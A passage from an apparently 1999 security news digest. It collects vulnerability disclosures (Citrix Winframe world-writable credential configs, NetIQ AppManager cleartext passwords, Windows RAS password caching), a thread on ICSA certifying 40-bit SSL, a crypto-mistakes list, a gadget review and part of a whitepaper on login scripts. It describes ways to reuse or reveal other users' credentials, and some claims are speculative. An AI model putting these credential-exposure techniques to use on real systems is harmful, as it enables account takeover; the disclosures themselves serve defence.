      because network administrators either carefully controlled system access
      privileges or used patches for known operating system flaws. If expanded
      to the whole agency, such simple fixes could protect systems better
      because hackers usually will move on to systems with easily exploitable
      weaknesses, de Ferrari said.

 39.1 [ISN] Nasa vulnerabilities potentially deadly
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

      NASA Leakage -- Deadly Leakage
      By MIKE HUDACK
      
      
      135 out of 155 NASA computer systems were found vulnerable by NSA hackers,
      reported the General Accounting Office.  The GAO, however, didn┤t say what
      was contained on those systems -- they simply called them "mission
      critical."  The fact is, however, that there┤s a lot more to these
      systems than NASA missions. 
      
      
      "[Some NASA software has] the functionality of serving in the capacity of
      a munition's guidance system," said an anonymous source inside NASA.  The
      weight of such a statement is quite obvious.  "The software, however,
      would require a certain amount of modification and adaptation to
      accommodate the purpose [of nuclear weapons guidance]," the source
      continued. 
      
      
      The pattern is clear: earlier this year, the world learned of espionage at
      Department of Energy laboratories in which neutron bomb technology was
      stolen.  At this point, there is no evidence that guidance technology from
      NASA computers has been stolen.  The fact remains, however, that China has
      a dedicated force of computer hackers who do nothing but probe US
      Government computers.  Their missing NASA would be extraordinarily
      unlikely. 
      
      
      The most damning evidence, reported by two anonymous NASA employees,
      states that NASA has known about security holes in its Information
      Technology facilities for more than a year.  According to them, "Security
      has consistently been reduced to a reactive role in every part of the
      agency.  [IT] which has long been identified as vulnerable is not
      prohibited."  In fact, one went so far as to suggest that it would take a
      fundamental change of NASA leadership to create any true security at the
      Agency.

 40.0 Citrux Winframe client for Linux vulnerability
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      
      Date: Fri, 28 May 1999 12:26:59 -0700
      From: David Terrell &lt;dbt@meat.net>
      To: BUGTRAQ@netspace.org
      Subject: Citrix Winframe client for Linux
      
      [ presumably this holds true for the other unix clients as well, but
        all I have is linux to test on ]
      
      The Citrix Winframe linux client (used for accessing Winframe and
      Windows NT Server Terminal Edition) has a simple configuration section.
      Perhaps too simple....  All configuration information is stored in a
      directory /usr/lib/ICAClient/config which is mode 777.  This in and
      of itself is bad news, since any user on the system can overwrite
      configuration data.
      
      The situation is actually much worse than that.
      
      When you start up the actual session manager (wfcmgr) you get a listbox
      of configured sessions.  The data for this listbox is stored in the mode
      777 file /usr/lib/ICAClient/config/appsrv.ini.  So  there's a single
      config file shared between all users.  A sample session profile follows:
      
      [WFClient]
      Version=1
      
      [ApplicationServers]
      broken=
      
      [broken]
      WinStationDriver=ICA 3.0
      TransportDriver=TCP/IP
      DesiredColor=2
      Password=0006f6c601930785
      Domain=NTDOM
      Username=user
      Address=hostname
      
      Yep.  Passwords are stored in some kind of hash.  What that hash is doesn't
      really matter since you can just bring up wfcmgr and log in as that user.
      
      Terrible.
      
      I tried mailing both support@citrix.com and security@citrix.com but
      neither of these addresses exist.
      
      
      Workaround?  wfcmgr supports the -icaroot parameter, but you basically
      need to copy all the files in for it to work.  So duplicate the tree in
      your home directory, fix permissions, and do wfcmgr -icaroot $HOME/.ica.
      
      Alternatively, don't use it.
      
      Distressing that the company that was "bringing multiuser concurrent logons
      to Windows NT" makes such a little effort at understanding multiuser
      security.... [further editorialization left to the reader]

      What I would like to know from you is whether you and others have been
      able to construct a "duh" list of typical, but unacceptable current
      practices that can easily be remediated.
      
      
      Here are my top 10 candidates for a "duh" list:
      
      
      1. Keys that are too short: Anything less than 80 bits for symmetric
      ciphers (128-bits prefered), or 1024 bits for integer-based public key
      systems. In particular this precludes use of 56-bit DES. (112-bit 3DES is
      fine.) 
      
      
      2. Poor quality random number generation. Random quantities are needed at
      many places in the operation of a modern cryptographic security system. If
      the source of randomness is weak, the entire system can be compromised. 
      
      
      3. Use of short passwords or weak passphrases to protect private keys or,
      worse, using them to generate symmetric keys. Bad passphrase advice
      abounds. For example, both Netscape and Microsoft advise using short
      passwords to protect private keys stored by their browsers. The simple fix
      is to use randomly generated passphrases of sufficient length. See
      http://www.hayom.com/diceware.html. 
      
      
      4. Re-use of the same key with a stream cipher. I have seen this done many
      times with RC4.  Even Microsoft appears to have gotten this wrong with
      their VPN (I do not know if it has been fixed). There are simple
      techniques to avoid this problem but they are often ignored.  See
      http://ciphersaber.gurus.com for one method. The potential for slipping up
      in stream cipher implimentation makes a strong case for using modern block
      ciphers wherever possible. 
      
      
      5. Using systems based on encryption techniques that have not been
      publically disclosed and reviewed. There are more than enough ciphers and
      public key systems out there that have undergone public scrutiny.  Many of
      the best are now in the public domain: 3DES, Blowfish, Skipjack, Arcfour,
      D-H, DSA. Others, e.g. RSA, IDEA can be licensed. 
      
      
      6. Ignoring physical security requirements for high value keys. In
      particular, no secret key is safe if it is used on a personal computer to
      which someone who is not trusted can gain physical access. 
      
      
      7. Lack of thorough configuration management for cryptographic software. 
      The best software in the world won't protect you if you cannot guarantee
      that the version you approved is the version being executed. 
      
      
      8. Poor human interface design. Cryptographic systems that are too hard to
      use will be ignored, sabotaged or bypassed.  Training helps, but cannot
      overcome a bad design. 
      
      
      9. Failure to motivate key employees. Action or inaction, deliberate of
      inadvertent, by trusted individuals can render any security system worse
      than worthless.  David Kahn once commented that no nation's communications
      are safe as long as their code clerks are at the bottom of the pay scale. 
      
      
      10. Listening to salesmen.  Any company that is selling cryptographic
      products has a good story for why the holes in their product really do not
      matter. Make sure the system you deploy is reviewed by independent
      experts.

      The Micro Alert Alarm for detecting
      radio/microwaves
      
      May 28 - Earlier this week, a news story I read troubled me greatly. It told about a
      European study that linked  cellular phone use to an increased incidence of brain
      tumors. For me, and millions of other cell phone junkies, this is a very scary thought.
      If the study is true, I could stop using my phones to minimize risks, or find out just
      how much "pollution" my devices are creating. THAT'S WHERE THE PEOPLE from AlphaLab Inc.
      come in. Someone there read a column I did on a cell phone antenna add-on that claimed
      to take the signal and move it away from your head. AlphaLab's David told me the company
      made a tiny device that could detect what your phone was really doing. I jumped at
      the chance to play with one.
      
      The Micro Alert Alarm is just what it says it is. It's a matchbox-sized device(2.25 inches
      by 1.6 inches by 0.75inches) that will (and I quote) "find what's emitting radio or
      microwaves,whether in hidden locations or in plainsight." The alarm puts forth a loud
      (annoying) beep when radio waves stronger than the level you select are present. If you
      move closer to the source of the RF-emitting device, the beeps will ultimately become a
      solid tone (more annoying). As you move away from the source, the beeping will stop 
      altogether (thankfully). 
      
      The alarm runs on a tiny battery that lasts three years or so. At its highest
      sensitivity, it should detect a typical cellular phone tower a half-mile away. Or an 
      analog cellular phone 40 feet away. Or a digital phone at 20 feet. Or a microwave oven 
      that's in use 10 to 50 feet away. To send the Micro Alert Alarm into nearly constant fits,
      unscrew the back and open one side. The sensitivity goes off the chart. In that mode, you 
      can see if someone has bugged a room (anong other things). The price for this little
      marvel? $81.50, plus shipping and handling.
      
      Does it work? You bet. Actually, sometimes it works too well. The most important part of
      working this device is setting it to your location. It can be very sensitive. I really
      couldn't test it at MSNBC. Way too many TV monitors, computer monitors and all sorts of
      broadcasting stuff around. And I couldn't really test it at home in Lower Manhattan. An
      old friend, Joe Sand, while helping me install an antenna on my roof, told me I lived
      so close to the broadcast antennas on the World Trade Center, that if someone made 
      sunglasses that detected radio waves, it would look as if I lived inside a tornado. He 
      was right. The alarm was nearly impossible to adjust at the "normal" setting. And it 
      never stopped beeping when set on "high" sensitivity. I did have better luck out at the
      Eastern Long Island test center. There I was able to adjust everything to my liking. I 
      found that the Micro Alert Alarm didn't like microwave ovens or TV sets or computer
      monitors - all from a few feet away. Cellular phones (one-third-watt output) set off the
      beeping from about three to five feet away and my Blackberry beeper (2 watts of 
      transmitting power) did the same from about one to two feet away. Not what AlphaLab 
      claims, but who knows if I ever really maximized all the settings. Is it worth it? That 
      depends. If you're the paranoid type, buy one today. I couldn't reference just how
      scientifically accurate it is, but under favorable conditions it did detect
      those invisible radio waves that could be dangerous to our health. Might turn out to be a
      good gift for someone with a pacemaker. On the other hand, a Micro Alert Alarm is said to
      find surveillance "bugs," detect police radar, leaky microwave ovens, fluorescent 
      lighting, electric typewriters and copy machines! Finally, you can take AlphaLab's
      advice and switch on your Micro Alert Alarm and put it in your pocket when you go out.
      If someone switches on a cell phone and sets off your alarm, you can kindly ask them
      to move away and stop polluting your personal space. Cool!

 45.0 AppManager 2.0 for NT from NetIQ displays passwords in cleartext     
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      
      From PacketStorm Security http://www.genocide2600.com/~tattooman/new.shtml
      
      AppManager 2.0 from NetIQ displays passwords in clear text!
      
      AppManager is a product which enables an enterprise to monitor the performance and 
      availability of Windows NT server services such as Exchange, SQL, etc.  It does this 
      via an agent on the target machine which reports back to a console.  The agents monitor 
      for things like low disk space, misbehaving services, and so on.  Like most products that 
      follow a manager/agent architecture, the agents must use an account with Administrator 
      privileges in order to do their job.  The problem is that when the authentication occurs, 
      the userid and password are passed in clear text, meaning that anyone with a sniffer can 
      read it as it goes across the wire.
      
      The other problem is that when someone with access to the AppManager console goes to look
      at a job, all he or she must do is right-click on the job, select Properties, select the 
      View tab, and voila! The userid and password that the job is using is right there for all 
      to see.  With version 3.0 they have replaced the password with asterisks, but the company 
      conceded that if someone were to copy the asterisks and paste them into a text file then the 
      password would be displayed instead of the asterisks!  More security through obscurity.
      
      The only fix so far is for an AppManager administrator to go into the Properties and 
      manually backspace over the password to remove it.  Once this is done it will not appear 
      again on any of the consoles.  However, if an "agent installation" job is run, the password
      WILL be displayed in Properties, but only for the duration on the install, which is usually
      between ten and fifteen minutes.  There is currently no way to prevent this.
      
      According to the company this is a "known issue."  After some more discussion I found that
      they have known about this for two years, yet apparently have not done anything to rectify 
      it.  They said that encrypting the authentication sequence traffic is difficult to do 
      which is one of the reasons why they haven't fixed it yet.  If their programmers can't 
      figure out in two years how to encrypt traffic then I think a another product should be
      chosen.

 47.0 ICSA certifies weak crypto as secure
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
 
      Date: Thu, 27 May 1999 00:24:26 -0700
      From: Lucky Green &lt;shamrock@NETCOM.COM>

      Subject: ICSA certifies weak crypto as secure
      
      I am becoming concerned about the apparent lack of professional competence
      within even well-known segments of the security community. I hope the
      incident I discovered is an isolated one, but even a single such incident is
      disquieting.
      
      There is a site that offers credit reports to consumers called
      ConsumerInfo.com. https://www.consumerinfo.com
      
      The site owner seems to have tried to do everything right. They joined
      TrustE. They had their site certified by ICSA. They clearly have given
      security a serious thought. But the company and all its customers were
      severely let down by ICSA, since the highly confidential information
      submitted by the user to the site is insufficiently "secured" by 40bit TLS.
      And it is not as if using 128 bit would have been a challenge. The site uses
      IIS and is located in the US. (Not that deploying 40 bit crypto would be
      acceptable even outside the US).
      
      I find it frightening to think that somebody calling themselves a security
      professional might even consider certifying a site using 40bit SSL to
      protect crucial customer information. Especially a site in the financial
      sector. Certifying obfuscation as security is an unacceptable level of
      performance by any computer security professional.
      
      I would like to be able to blame simple ignorance of crypto for this deed,
      which alone would be bad enough coming from a security "professional", but I
      am afraid that's not possible since it is inconceivable that the certifying
      ICSA member was unaware that 128 bit TLS/SSL is industry standard. Instead,
      we must assume that for reasons unknown, but ultimately irrelevant, a
      certification was issued for technology the issuer knew to not afford the
      customer security or simply didn't bother to check the crypto strength.
      Either way this condemns ICSA (a member of the Gartner Group), and reflects
      very badly on our industry as a whole.

      I think it's pretty common, in 1997 I heard of Ernst and Young in NZ certifying
      40-bit SSL as being secure for banking use.  I mentioned this in a posting to
      sci.crypt titled "Crypto for beancounters" and got several responses from
      people saying they'd had similar experiences (not necessarily with E&Y, but
      with Big 6 firms who did security audits).  The summary of the responses was:
      
      -- Snip --
      
      [...]
      
      - Getting a security system accepted is more likely if it's been reviewed by
        the company auditors, even if the people involved don't have much experience
        with the technology.
      
      - Even if the auditors don't have much crypto experience, they're generally
        very good at finding things like procedural flaws.  Most real systems fail
        because they're not used properly, not because of technical attacks.
        Accountants/auditing firms are very good at finding problems like this.
      
      - Some firms may have experience in auditing crypto, but more importantly they
        should be able to call in outside experts to check the crypto.  Requiring
        that the audit report include details of how the crypto was evaluated and (if
        external experts were used) by who would be a good idea.
      
      In summary use the auditing firm to cover security procedures, but (unless they
      have expertise in the area) leave assessment of the crypto software to known
      experts in the field and/or insist in seeing details of how the crypto was
      assessed.
      
      -- Snip --
      
      It's really just an issue of being able to prove due diligence - all you need
      is the right people to check the "Uses encryption" box and you're OK.  Whether
      the encryption is any good or not is largely irrelevant, at least for the
      purposes of the exercise, which is to pass the audit.
      
      Peter.

      Subject: ICSA - Certified Sites and Criteria Issues
      
      -----BEGIN PGP SIGNED MESSAGE-----
      
      While I am constrained by NDAs from discussing the specific issues of
      any particular ICSA customer's security issues or policy, I will
      respond "in general" to Lucky Green's posting regarding the use of
      40-bit cryptography as part of an ICSA certified configuration.
      
      Participants in our site certification program (TruSecure) are
      required to meet in excess 200 criteria elements; covering such issues
      as physical security, business continuity, personnel management,
      network architecture, patches and updates, privacy, and sensitive
      information handling.    Nearly all of the criteria elements are
      driven by the customer's security and operational policy-- which is
      derived from their business objectives and risk management approach.
      
      The 'specific' criteria elements which govern the use of cryptography
      in the context of the customer site are (verbatim):
      
      HUF0007:    The handling procedures, security measures, and
      classifications for sensitive information are documented in a
      Sensitive Data Policy.   The procedures identified in the policy are
      in place.
      HUF0014:    The site's Internet Security Policy, as documented on form
      TS012.01 - Security Posture and Policy, has been implemented
      HUF0027:    If client data is gathered by the target, then the site
      must publish online its site visitor privacy, and user data security
      policies.
      SVC0034:    Sensitive Information, as identified in HUF0007 is
      encrypted and uses protocols which are acceptable to both the host and
      user.
      [in this context the "host" is the site operator and the "user" is
      their client base]
      
      In this context  _is_ possible for a customer to mandate (via their
      own policy) use of whatever levels of cryptography they view as being
      appropriate to their business model and customer requirements.   For
      example, if a customer policy specifies 128-bit TLS,
      client-certificates, and token-based auth--  they will be validated at
      that level.   And if validating the server's identity to the end-user,
      or no-hassle compatibility with zillions of consumers' bargain-club-PC
      40-bit browsers is a goal-- a different policy might well result.
      
      Yes, we (ICSA Labs) do agree that 40-bit/8-second, and even 56-bit
      encryption have become low-hanging-fruit on the confidentiality tree.
       The Gilmore/EFF demonstrations and recent IETF SAG discussions have
      put that writing on the wall.   Do we need to add an "appropriate
      crypto strength" element to the TruSecure criteria?  Yes I guess we
      do.

      Now I am really getting worried. From your post it is clear that you, a
      representative of ICSA, are unaware that by enabling 128 bit TLS/SSL on a
      server you by no means prevent users limited to 40 bit crypto from accessing
      it.
      
      Sure, a server can be specifically configured to not allow access by 40 bit
      browsers, but the overwhelming majority of 128 bit capable websites support
      both 128 and 40 bit crypto and will automatically use the highest strength
      supported by the browser. No incompatibility issues are introduced by
      enabling full-strength crypto.
      
      The site certified by ICSA did not support 128 bit crypto even to browsers
      that support it. Which is, IMHO, unacceptable for a site that had their
      security checked by an audit.

      If ICSA is
      
      "constrained by NDAs from discussing the specific issues of any
      particular ICSA customer's security issues or policy"
      
      and
      
      "Nearly all of the criteria elements are driven by the customer's
      security and operational policy-- which is derived from their business
      objectives and risk management approach."
      
      and you say
      
      "Do we need to add an "appropriate crypto strength" element to the
      TruSecure criteria?  Yes I guess we do."
      
      then what, pray tell, should a consumer visiting
      
      https://www.consumerinfo.com/n/security.htm?htm+l
      
      glean from the fact that the page linked on their site from your ICSA
      icon contains the following;
      
      "ConsumerInfo.Com employs sophisticated encryption"
      
      and further states;
      
      "In addition to employing these high-security measures, ConsumerInfo.Com
      has undergone the rigorous certification process for the International
      Computer Security Association's (ICSA) Web Certification program. This
      process examined every aspect of our security precautions, encompassing
      an on-site inspection of our facility for physical security and policy
      plus a remote assessment of our potential vulnerabilities to web-based
      attacks. In addition, the ICSA's certification is a continuous process,
      repeated several times during the year and renewed annually, so you know
      ConsumerInfo.Com's security measures are state-of-the-art."
      
      However, the bottom line is that;
      
      - They are *NOT* employing "sophisticated encryption", they're employing
      the least sophisticated deployable.
      
      - They also say ICSA "examined every aspect of our security
      precautions", but in fact, you only examined those aspects defined in
      their policies.
      
      - They also claim that because of your certification, their customers
      "know ConsumerInfo.Com's security measures are state-of-the-art" when in
      fact their *NOT*.
      
      I will not, at this time, question the integrity of ICSA. Nor will I
      suggest that ConsumerInfo.Com is out and out lying.
      
      I will, however, suggest that ICSA is tacitly allowing ConsumerInfo.Com
      to mislead their customers via the ICSA Web Certification approval. By
      ICSA not being permitted, by NDA, to discuss certification they have
      performed, it renders, IMNSHO, the certification itself *worthless*. It
      would appear that ConsumerInfo.Com has been allowed to say anything they
      want about their work with ICSA and, by NDA, ICSA cannot rebuke it.
      
      ICSA Web Certification reports should be public, or, not trusted.

      You can ISO9001 certify the process of shooting yourself in the foot,
      so long as the process is documented and reliably produces the proper
      result.
      
      Do you require certified sites post their security policy?  If not,
      how do I know that the policy doesn't explicitly accept the presense
      of phf in /cgi-bin?  Would it be possible to have that in my policy
      and still get certified, if I have good business reasons for putting
      it in place?
      
      This flap may be a result of certifying compliance to policy, but the
      relying parties on your mark should not be expected to be able to read
      and understand those policies; they should be able to rely on your
      mark to say that the policies make sense.  Incidentally, do you
      require sites to post these policies to which you certify compliance?
      
      I think that the high level message here (and from the
      TRUSTe/Microsoft crap) is that what organizations like ICSA and Truste
      are certifying is not what people who may be expected to rely on those
      marks expect is being certified.

      In my experience with Netscape and apache-SSL the lowest strength
      cipher (apart from no cipher at all) is used. Unless you disable the
      weaker ciphers in Netscape, netscape tries them first and will connect
      if the server allows them.
      
      Of course this doesn't invalidate your statement that there is no
      problem with enabling full-strength crypto, but it does mean there is
      also little to gain by doing so.

      A client in SSL sends all its supported ciphers at once, it doesn't "try"
      some, then "try" others. The server chooses which cipher to use from amongst
      those the client supports. If you have 128-bit capable Netscape, and 128-bit
      capable Apache SSL, or a Netscape server, or Stronghold, or whatever, you get
      full strength crypto, unless there's a bug in the server.
      
      Obviously if one or the other doesn't support it, you don't.

      Jeremey.

              I'm taking it upon myself to respond for Jon who's busy trying to
      have a life outside the office.  As he did, I'm going to try to steer
      clear of a specific discussion of any of our customers.
              We thank the open review process of the total crypto community for
      bringing this to our attention.   We will include this discussion in
      our ongoing process to maintain the TruSecure criteria.
              I'd like to restate what I feel is the most pertinent criterion that
      bears on this issue:  the criterion requires encryption and protocols
      acceptable to both the host and the client.  As a practical matter,
      for web activity this is either 40-bit SSL or 128-bit SSL.  The
      TruSecure customers have the flexibility to choose, and their
      customers, in turn, decide if this is "acceptable."
              Clearly, most of the readers of these lists regard 128-bit SSL as the
      minimum they would find acceptable.  However I think those same
      readers would acknowledge that the majority of users on the Internet
      worldwide today are using a 40-bit version of the popular browsers.  A
      business has every right to decide if 40-bit SSL is the level of
      security they feel is appropriate for the information they are
      processing.
              A TruSecure customer may make a business decision that 40-bit SSL is
      "acceptable" for the communication of data from their hosts to their
      clients.  Once this decision is made, they may configure their systems
      for 40-bit only.
              It should be clear from Jon's previous message that, in the abstract,
      128-bit SSL is preferable to 40-bit SSL.  However, 40-bit SSL for all
      it's faults, protects data in transit from the client to the host from
      all but a targeted attack by an experienced, well-resourced adversary.
       40-bit SSL provides superior security than the majority of meatspace
      exchanges of sensitive information.

              Certification requires compliance with our criteria.  The best web
      page we have describing this is: http://www.trusecure.net/process.html
       If you want the nitty gritty details, browse to
      http://www.trusecure.net/
      and either go to the library or click the "contact us" link.
              ICSA helps customers address risks across multiple categories
      (physical, hacking, malicious code, spoofing, eavesdropping, lack of
      knowledge/awareness, lack of trust, DoS, privacy-user by site & data
      subject, lack of interoperability).  We developed a methodology to
      focus on high risk/cost categories and follow this methodology with
      our customers.  When addressing the issue of privacy, ICSA approaches
      the matter by addressing the risk of capturing customer information
      across the wire and as it resides on the customers server.  We do
      require the use of encryption but choose to let the customer to decide
      the level based on the assets they are protecting, the impact to their
      business, and the fact that the real concern is the data residing on
      the server un-encrypted.  ICSA therefore works with our customers to
      set up multiple layers of synergistic controls that not only address
      the use of encryption but also those mentioned above.
              We rely on addressing our customers' issues not only from a
      technology perspective, but from a business level one as well.  When
      deploying security, ICSA will always address how technology impacts
      our customers operations and costs.

              For the purposes of site certification we would not certify a site
      with phf in the cgi-bin directory.  Our criteria do restrict this.
      However, we have customers who have purchased TruSecure but have "good
      business reasons" for ignoring or violating one or more of our
      criteria.  ICSA has a process to review these occurrences and have
      withheld certification from some of these customers.  Indeed, we have
      customers who are quite satisfied with their TruSecure purchase
      without achieving certification.  Without turning into a
      sales/marketing droid, we try to emphasize TruSecure as a process to
      provide acceptable security to the customer; many customers are
      satisfied without completing certification and know this before their
      purchase.

              Certified sites must post a privacy and user data security policy as
      part of our criteria.  We do not require the site to post their
      security policy.  Most enterprises would be reluctant to post an
      un-santitized version of their security policies which opens the
      question of how much sanitization is necessary or desirable.  I don't
      believe it would be wise to require they post the nitty gritty details
      of their policies.  One would not want details such as these widely
      known:
      
              Inbound telnet is blocked except from IP xxx.xxx.xxx.xxx to
      yyy.yyy.yyy.yyy which is permitted so Y Inc can review progress
      reports on Project Z.

              For any customer, we examine every aspect defined by *our* criteria,
      which includes examining their security policies and implementations,
      but these two aspects are but a handful of the 200+ criteria we

              The way this paragraph is constructed makes it impossible to respond
      to it.  We would like to respond, and explain how certification is not
      as you say, "worthless," but to do so would be to reveal confidential
      information about a customer.

              Incorrect, we understand this fact.
              Again, the criteria require encryption and protocols acceptable to
      both the host and the client.  Popular browsers provide the capability
      for users to click on an icon and determine the encryption being used,
      if any.  Undoubtedly that's how this thread started.

      A few thoughts on the subject. 
      
      First, with the frightening amount of completely unsecured consumer info
      sites on (and off) the net today, I would disagree that ICSA's actions
      reflect "very badly" on our industry.  Because there are much easier
      targets, consumerinfo.com can be resonably certain that it won't even be
      attacked for quite some time.  At least until most of the rest of the
      sites are secure in the same fashion. 
      
      Don't get me wrong, I'm not advocating 40-bit encryption as 'secure,' but
      it is 'more secure' than nothing at all.  And until the ingorant IT
      managers with sites on the net clue in, this kind of certification won't
      _hurt_ our industry.  Please don't attack me - I'm just saying that while
      we professionals might recognize weaknesses in this level of security,
      those outside don't and "we" still look good to them. 
      
      Second, if you've every been to a hacker BBS/site, you have to know that
      getting into Equifax or any other reporting agency is pitifully easy.  If
      you think 40-bit encryption is weak, how about a 2 character alphanumeric
      "password" on accounts that can be pulled from your own credit report? 
      And for that matter, there are posted algorithms to the account scheme, so
      you can even generate your own. 
      
      I will agree that there are more unsavory characters on the net than there
      are people aware of CBI dialups.  But then again, 40-bit crypto is not
      exactly _easy_ to crack.

      On March 20th, Dieter Goepferich [dieter.goepferich@bigfoot.com]
      discovered a vulnerability involving both RAS and RRAS. This was
      subsequently reported in Heise Online, a German publication;

      Dieter originally reported it via some "product improvement suggestion"
      web form on www.microsoft.de back in March. Together we informed
      Microsoft Security (secure@microsoft.com) back in April.
      
      By default the registry key is only accessible to Administrator and the
      user/owner of the passwords, but it represents a potential threat and a
      location of password information which would not otherwise be expected.

      Patch Available for "RAS and RRAS Password" Vulnerability

      Summary
      =======
      Microsoft has released a patch that eliminates a vulnerability in the
      Microsoft (r) Windows NT  (r) Remote Access Service (RAS) and Routing and
      Remote Access Service (RRAS) clients, in which a  user's password is cached
      even if the user de-selects the "Save password" option.
      
      Issue
      =====
      When the client software for Microsoft RAS or RRAS is used to dial into a
      server, a dialogue  requests the user's userid and password for the server.
      On the same dialogue is a checkbox whose  caption reads "Save password" and
      which is intended to provide the user with the option to cache  their
      security credentials if desired. However, the implemented client
      functionality actually  caches the user's credentials regardless of whether
      the checkbox is selected or de-selected.
      
      Cached security credentials, which include the password, are stored in the
      registry and protected  by ACLs whose default values authorize only local
      administrators and the user to access them.  Windows NT 4.0 Service Pack 4
      also provides the ability to strongly encrypts the password data  stored in
      the registry using the SYSKEY feature.
      
      While there are no reports of customers being adversely affected by this
      vulnerability, Microsoft  is proactively releasing a patch that restores
      correct functionality to the password caching  function. The patch should be
      applied to all machines that are used as RAS or RRAS clients. It is
      important to note that RRAS servers also can be used as RRAS clients, and
      any machines used in  such a capacity should have the patch applied as well.
      
      
      Affected Software Versions
      ==========================
       - Microsoft Windows NT Workstation 4.0

      Wow, talk about goofing up.
      
      Eric Schultze correctly pointed out that he, together with Lisa
      O'Connor, Martin Dolphin, and Joe Greene reported this problem with RAS
      originally way back on March 19th, 1998 <-- (note, 1998, not 1999). See
      the original message at;

      gtraq&F=P&S=&P=4209
      
      (URL is wrapped).
      
      I, most inappropriately, credited another with the discovery in March of
      this year.
      
      Its funny, when David LeBlanc first prompted me about this "discovery"
      this year, I could have sworn I'd seen it before but I failed to check
      my own archives...tsk tsk...;-]
      
      So, to Lisa, Martin, Joe, and Eric, please accept my humble apologies!
      
      To Microsoft, why the hell did it take a publication in a German
      magazine to provoke you to fix something that had been reported here a
      full year before?? Could it have been the fact that the 3/99 publication
      included an exploit tool? Maybe we need to have an exploit coding group
      at NTBugtraq that produces a tool for everything reported and
      distributes said tool to all and sunder?

 49.0 Whitepaper:The Unforseen Consequences of Login Scripts By Dan Kaminsky

                     Insecurity By Design:
                 The Unforseen Consequences of
                          Login Scripts

                        By Dan Kaminsky
                                     
                                                               
       A common aspect of most client-server network designs is the login script.  A
       set of commands executed upon provision of correct username and password,
       the login script provides the means for corporate system administrators to
       centrally manage their flock of clients.  Unfortunately what┤s seemingly good for
       the business turns out to be a disastrous security hole in the University
       environment, where students logging into the network from their dorm rooms
       now find the network logging into them.  This hole provides a single, uniform
       point of access to any number of previously uncompromised clients, and is a
       severe liability that must be dealt with with the highest urgency.  Even those in the
       corporate environment should take note of their uncomfortable exposure and
       demand a number of security procedures described herein to protect their
       networks.  One possible solution for some may be the DoxPrint system designed
       by this author; it allows users to print to Novell Print Queues over the Network
       Neighborhood without requiring any Novell code on the client.  Affected
       universities should consider switching to systems that do not require full logins,
       until more stable and secure systems are available.
        

                                                               
       What if I told you that every time you turned on your computer, the government
       could control exactly what would load?  What if, every time you entered your
       username and password, your ISP gained the ability to specify exactly what
       software should load, what files to send, maybe even what data to erase?  What
       if, merely by accessing a web page, your system came under the full control of
       the page's author, or more accurately any possible author of that page,
       authorized or not?

       In each case, the security violation is quite obvious.  Merely drawing electricity,
       connecting to the Internet, or accessing a web page does not constitute an open
       license to fully control a computer.  In legal terms, each action by the user is an
       ongoing communication under contractural obligations--for example, the user
       agrees to pay a fee and provide authentication material in the form of username
       and password, and in return the ISP agrees to provide Internet access.  Never
       does the user agree to a "remote root access contract"!  Whether this access is,
       in fact, used or abused is irrelevant.  None of the user's actions constitutes
       acceptance of "handing over the keys of the computer" to an external agent.
        

                                                               
       Of course, sometimes the issue of what, exactly, the term "user" means becomes
       muddled.  In a corporate environment, the user of the computing environment is
       not necessarily its owner, nor is he or she the highest authority regarding what
       should or shouldn't run on the machine.  Login scripts, composed of lists of
       commands to be executed on the client machines upon the correct provision of
       username and password, provide a means for the central administrators of
       corporate computers to automatically connect to network drives and printers. 
       They also allow the administrators to load any software they choose upon the
       client computers as if the user himself had run it.  Anything from Censorware to
       remote control software is within the power of the administrator to load.  This
       freedom to centrally manage systems is extremely powerful. Some would argue
       that it's an intrinsic capability of any client-server architecture that claims to be
       "ready for the enterprise", as the prospect of physically handling each client
       machine is extraordinarily expensive in terms of funds and manpower.  With
       every major client-server networking architecture automatically executing the
       commands contained within login scripts *by default*, it would appear that
       networking engineers are serving the perceived requirements of the corporate
       mentality quite well.

       Small problem:  University dorm networks aren't corporate.
        

                                                               
       The authentication procedures built into Windows NT Domains and Novell
       Netware are often used by Universities as a means for controlling access to file
       and print resources.  Both the University and the student are in an advanced
       version of an Internet Service contract, but it's an ISP contract nonetheless.  The
       user(student) agrees to pay a fee(tuition) and provide authentication material in
       the form of username and password, and in return the ISP(University) agrees to
       provide access to network resources.  Unfortunately, to provide access to file
       and print resources, Windows(the predominate computing environment on the
       desktop) cannot generally delay the login procedure until the time of actual
       usage.  Indeed, just as in the corporate world, the system is presumed to be the
       property of the institution and the student/employee must thus authenticate him or
       herself upon startup of the machine. Also, just as in the corporate world, the
       system will by default execute any commands the system administrators have
       deemed appropriate.

       The school does not own the hardware, nor does it own the operating system
       running upon it.  Even if it did both, it would not own the data on those systems;
       students do not generally relinquish ownership of their own labor to their
       educational institution.  It is of the highest inappropriateness, then, that University
       Information Technology departments receive full access to that which is plainly
       not theirs.  It's not their faults, really.  They just want to track use and prevent
       abuse of pseudo-public resources.  The only way to do this lies with the
       corporate authentication mechanisms within Netware and NT Domains.  That the
       default setting in both environments is to load any login script provided is the fault
       of their respective designers, not of the accidental victims in IT.  Ironically, not a
       bug but a long standing design decision is responsible for what is likely the
       greatest single computer security vulnerability at many universities.
        

                                                               
       Saying that Login Scripts--something which, for so long, have been considered
       as innocuous as an ugly background--are indeed such a powerfully damaging
       technology is a strong statement that needs to be backed up. Login Scripts are
       so dangerous because they eliminate the most effective element of the security
       design behind Windows 95 and Windows 98: Security Through Impossibility. 
       By default, Windows runs almost no services.  You can't telnet in, you can't view
       the screen remotely, and there is no sendmail or ftp server with buffers to
       overflow.  The only common service run is the infamous NetBIOS.  The result of
       this restrictive environment is interesting:  While it's not particularly difficult to
       remotely crash a 95/98 machine, it's surprisingly hard to remotely compromise
       this erstwhile insecure operating system without at least some interaction from the
       user.  It's the difference between a locked door and a brick wall.

       Some arguably overzealous administrators will use this facet of security to ban
       any and all services not explicitly authorized(by an Act of God, usually).  This
       can be excessive, and often prevents significant educational and productivity
       benefits.  It's not that services are necessarily worrisome so much as the universal
       deployment of identically insecure services with significant value compromisable
       by unauthorized access--dedicated servers, unfortunately, have a tendancy to fit
       very nicely into this category. Sysadmins understand well that since both their
       servers are at risk and downtime is expensive, it is necessary to have recent
       backups of servers at all times.  Sometimes, client desktops are also backed up. 
       But, in an educational institution, it is grossly improper for the university to have
